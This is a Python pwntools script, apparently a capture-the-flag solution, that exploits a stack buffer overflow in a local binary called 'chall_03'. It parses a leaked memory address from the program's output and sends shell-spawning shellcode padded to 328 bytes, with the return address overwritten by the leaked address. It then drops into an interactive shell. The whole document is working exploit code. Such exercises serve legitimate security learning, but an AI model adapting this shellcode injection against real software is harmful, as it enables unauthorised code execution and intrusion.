from pwn import *
import re

context.arch = "amd64"
binary = context.binary = ELF('./chall_03')
p = process(binary.path)

resp = p.recv()
print(resp.decode())

leak_match = re.findall(b"(0x[0-9a-f]{6,16})", resp)

if not leak_match:
    log.error("No memory address leak found in the binary's output.")
    exit(1)

try:
    leak_as_int = int(leak_match[0], 16)
    log.info(f"Leaked address: {hex(leak_as_int)}")
except ValueError:
    log.error("Failed to convert leaked address to an integer.")
    exit(1)

try:
    payload = asm(shellcraft.sh())  
    padding_length = 328 - len(payload)
    if padding_length < 0:
        log.error("Shellcode is too large to fit in the buffer.")
        exit(1)
    payload += b'A' * padding_length 
    payload += p64(leak_as_int)
except Exception as e:
    log.error(f"Failed to create payload: {e}")
    exit(1)

log.info(f"Payload length: {len(payload)} bytes")

p.sendline(payload)

try:
    p.interactive()
except Exception as e:
    log.error(f"Failed to interact with the process: {e}")
    exit(1)
